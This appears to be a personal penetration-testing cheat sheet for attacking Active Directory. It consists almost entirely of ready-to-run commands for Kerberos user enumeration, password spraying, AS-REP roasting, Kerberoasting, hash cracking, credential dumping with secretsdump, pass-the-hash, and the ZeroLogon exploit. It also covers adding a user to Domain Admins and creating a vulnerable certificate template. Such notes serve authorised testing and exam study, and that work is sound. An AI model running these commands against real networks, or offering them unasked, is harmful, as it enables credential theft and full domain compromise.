KERBRUTE:
---
#kerbrute #ad #enum #passwordspray #userenum #kerberos 

Install/Build latest kerbrute:

```bash
go install github.com/ropnop/kerbrute@latest
#or the good old-fashioned
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build
```

Sync time to DC, otherwise password spray / enum / brute force may fail!

```shell
sudo ntpdate -s $TARGET_IP
```

then

```bash
kerbrute userenum --dc $TARGET_IP -d $TARGET_AD users -t 100 -v
kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD -t 100 -v users $PASSWORD 
kerbrute bruteuser --dc $TARGET_IP -d $TARGET_AD -t 100 -v passwords $USER
kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-pass
```

Dev version of kerbrute auto-checks for AS-REP roastable accounts
```bash
kerbrute userenum --dc $TARGET_IP --domain $TARGET_AD --hash-file hashes --downgrade users
```

LDAP
----
```bash
nmap -n -sV --script "ldap* and not brute" $TARGET_IP
```

```bash
ldapsearch -H ldap://$TARGET_IP -x -s base namingcontexts
```

```bash
ldapsearch -x -H ldap://$TARGET_IP -b 'DC=$DOMAIN,DC=$DOMEXT' | grep -B2 Person | grep "@" | awk '{print $2}'
```

```bash
ldapsearch -H ldap://$TARGET_IP -x -b "DC=$DOMAIN,DC=local" '(objectClass=person)'
```

AS-REP Roasting
---
#as-rep-roasting #kerberos #asrep-roasting

No password ticket query against a user list, not requiring Kerberos pre-authentication,
AKA. 
AS-REP Roasting or ASREP Roasting

```shell
impacket-GetNPUsers -no-pass -usersfile users -dc-ip $TARGET_IP $TARGET_DOMAIN/ -format hashcat
```

Against single user:

```shell
impacket-GetNPUsers $TARGET_DOMAIN/$TARGET_USER -no-pass
impacket-GetNPUsers -dc-ip $TARGET_IP -request -outputfile hashes.asreproast $AD_DOMAIN/$USER
```

Or if you got a shell on machine:
#rubeus 

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:C:hashes.txt
```

And then brute force:
#ntlm #bruteforce 

```shell
hashcat -m 18200 hashes $ROCKYOU
#Print pass
hashcat -m 18200 hashes $ROCKYOU --show | awk -F':' '{print $3}'
```

NTLM dump from mimikatz brute for OSCP :
```bash
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Crack AS-REP roast hash:
#hashcat #asrep-roasting #bruteforce 

```bash
sudo hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Dump hashes using account credentials:
#dump #creds

```shell
impacket-secretsdump -dc-ip $TARGET_IP $USER:$PASSWORD@$TARGET_DOMAIN
#OR try
impacket-secretsdump $USER:$PASSWORD@$TARGET_IP
```

Connect to Windows Machine using obtained hash (pass the hash):
#winrm #evil-win-rm #evilwinrm #pth #pass-the-hash

```shell
#remove aad3b435b51404eeaad3b435b51404ee: from hash
evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
```
Change user password using powershell / powerview:
---
#change-password
```powershell
. ./PowerView.ps1
Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force) -Domain $DOMAIN
Add-NetGroupUser -UserName $USER -GroupName "Domain Admins" -Domain $DOMAIN
```

Pre-compiled Windows binaries (Rubeus, Certify …):
---
#ghostpack #rubeus #certify #precompiled

[https://github.com/GhostPack](https://github.com/GhostPack)

---
Kerberoasting:
---
#kerberos #kerberoasting #ad #active-directory #windows #spn

The attacker impersonates an account user with a service principal name (SPN) and requests a service-related ticket.

Check if vulnerable accounts are present:

```shell
impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER
```

Send request to TGS and extract the hash:

```shell
impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER -request
```

#kerberoasting #rubeus

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

ZeroLogon (CVE-2020-1472)
---
```bash
git clone https://github.com/dirkjanm/CVE-2020-1472
python3.11 cve-2020-1472-exploit.py $NB_NAME $TARGET_IP
impacket-secretsdump -no-pass -just-dc $NB_NAME\$@$TARGET_IP\
evil-winrm -u administrator -i $TARGET_IP -H $HASH
```
Overpass the hash attack:
---
when NTLM protocol is disabled
#overpass-the-hash

```shell
impacket-getTGT $TARGET_DOMAIN/$USER -hashes :$HASH
export KRB5CCNAME=$(pwd)/$USER.ccache
impacket-psexec $TARGET_DOMAIN/$USER@$MACHINE_NAME.$TARGET_DOMAIN -k -no-pass
```

PKI Admin access
---
#pki #pki-admin #ad-template #vulnerable-template

PKI Admin can be abuse to create a vulnerable cert template which can then be exploited with Certipy (or certify and rubeus):

Download template creator module:

```
wget https://raw.githubusercontent.com/GoateePFE/ADCSTemplate/master/ADCSTemplate.psm1
# upload psm1 file to target
```

Use the module to create a vulnerable template:

```powershell
Import-Module .\ADCSTemplate
Export-ADCSTemplate -DisplayName Administrator > .\admin.json
download admin.json
```

then edit the following JSON properties:
```JSON
"msPKI-Certificate-Name-Flag":  1,
"msPKI-Enrollment-Flag":  0,
```
and make sure to have:
```json
"pKIExtendedKeyUsage":"1.3.6.1.5.5.7.3.2"
```
then
```powershell
New-ADCSTemplate -DisplayName Administrator2 -JSON (Get-Content .\admin.json -Raw) -Publish -Identity "$AD_DOMAIN(1st part no ".")\$USERNAME"
Set-ADCSTemplateACL -DisplayName Administrator2 -Type Allow -Identity '$AD_DOMAIN(1st part no ".")\$USERNAME' -Enroll

```
Scan with certipy 4.4+ for vulnerable templates
notes are in "Certificate Abuse" #Certificate-Abuse

List Active Directory AD Users:
---
#enumerate #ad #users #smb-enumeration

```shell
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD --users
crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD --users | grep "$TARGET_AD" | sed 1d | awk '{print $5}' | sed 's/[^ ]*\\//' | tail -n +2
```

Password spraying with CME

```shell
crackmapexec smb $DOMAIN -u users -p $PASS --continue-on-success
```

Start collecting data for BloodHound:
---
#sharphound #bloodhound #ad

```powershell
powershell -ep bypass
. .\SharpHound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\$USER\Desktop\ -OutputPrefix "audit"
```

```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetUser
Get-NetUser | select cn
Get-NetGroup
Get-NetGroup "$GROUP_NAME" | select member
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-ObjectAcl -Identity $USERNAME
Convert-SidToName $SID
Find-DomainShare #-CheckShareAccess
```

resolve local machine address
`nslookup.exe $ADDRESS`